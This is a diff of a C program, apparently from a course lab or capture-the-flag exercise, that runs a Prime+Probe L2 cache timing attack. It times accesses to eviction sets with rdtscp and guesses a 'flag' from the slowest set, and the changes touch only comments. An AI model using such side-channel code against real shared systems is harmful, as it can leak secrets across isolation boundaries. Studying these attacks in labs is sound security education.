@@ -2,8 +2,8 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
-#include <unistd.h>    // For sleep()
-#include "util.h"      // ❗ Critical to include this
+#include <unistd.h>
+#include "util.h"  // ✅ VERY IMPORTANT to include this header
 
 #define NUM_SETS NUM_L2_CACHE_SETS
 #define CACHE_LINES_PER_SET 8
@@ -12,33 +12,33 @@
 int main() {
     printf("Attacker started...\n");
 
-    // Allocate hugepage buffer
+    // Allocate huge page buffer
     char *buffer = get_buffer();
     if (!buffer) {
         printf("Failed to allocate buffer.\n");
         return 1;
     }
 
-    // Get candidate eviction sets
+    // Get candidate sets (array of pointers to memory addresses)
     char **candidate_sets = get_candidate_sets();
     if (!candidate_sets) {
         printf("Failed to get candidate sets.\n");
         return 1;
     }
 
-    uint64_t times[NUM_SETS] = {0};
+    uint64_t times[NUM_SETS] = {0};  // array to store latencies per set
 
-    // Measure latency for each set
+    // Collect multiple samples to reduce noise
     for (int sample = 0; sample < SAMPLE_COUNT; sample++) {
         for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
             uint64_t total_latency = 0;
             char **set = (char **)&candidate_sets[set_idx * CACHE_LINES_PER_SET];
 
-            // Access each line in the set
+            // Probe each cache line in the set
             for (int i = 0; i < CACHE_LINES_PER_SET; i++) {
                 lfence();
                 uint64_t start = rdtscp64();
-                *(volatile char *)set[i];  // Access memory
+                *(volatile char *)set[i];
                 lfence();
                 uint64_t end = rdtscp64();
                 total_latency += (end - start);
@@ -48,7 +48,7 @@ int main() {
         }
     }
 
-    // Find the set with maximum latency
+    // Find the set with the maximum cumulative latency
     int guessed_flag = -1;
     uint64_t max_latency = 0;
     for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
@@ -60,7 +60,7 @@ int main() {
 
     printf("\nFinal guessed flag is: %d\n", guessed_flag);
 
-    // Clean up (optional, not strictly needed since program exits)
+    // Free allocated resources
     free_candidate_sets();
     free_buffer();
 
